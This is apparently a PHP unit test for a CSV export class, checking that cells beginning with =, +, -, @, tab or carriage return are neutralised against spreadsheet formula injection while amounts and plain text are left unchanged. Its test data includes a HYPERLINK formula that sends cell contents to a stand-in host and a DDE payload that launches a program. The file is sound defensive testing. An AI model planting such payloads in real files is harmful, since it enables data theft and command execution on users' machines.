<?php

declare(strict_types=1);

namespace Kern\Platform\Tests\Unit\Text\CsvFileTest;

use Kern\Platform\Text\CsvFile;

/** The one cell of a one-row file, as a spreadsheet would read it after the BOM. */
function cellOf(string $value): string
{
    $handle = fopen('php://temp', 'r+');
    assert($handle !== false);
    fwrite($handle, substr(CsvFile::fromRows([[$value]]), strlen("\u{FEFF}")));
    rewind($handle);
    $row = fgetcsv($handle, escape: '\\');
    fclose($handle);

    return is_array($row) ? (string) $row[0] : '';
}

it('writes a cell a spreadsheet would run as text instead', function (string $formula): void {
    // Text a stranger chose — a counterparty, a transfer description — arrives in these columns.
    expect(cellOf($formula))->toBe("'" . $formula);
})->with([
    'a formula' => '=HYPERLINK("https://evil.example/?"&A2,"x")',
    'a plus' => '+cmd|\' /C calc\'!A0',
    'a minus that is not a number' => '-2+3',
    'an at' => '@SUM(A1:A2)',
    'a leading tab' => "\t=1+1",
    'a leading carriage return' => "\r=1+1",
]);

it('leaves an amount alone, though a negative one starts with a minus', function (string $amount): void {
    // A spreadsheet must still add these up, and a number cannot be a formula.
    expect(cellOf($amount))->toBe($amount);
})->with(['-12.50', '1234.56', '0.00', CsvFile::decimal(-90_000)]);

it('leaves ordinary text alone', function (): void {
    expect(cellOf('Kaufland Romania'))->toBe('Kaufland Romania')
        ->and(cellOf('Plată 3/2026 - chirie'))->toBe('Plată 3/2026 - chirie')
        ->and(cellOf(''))->toBe('');
});
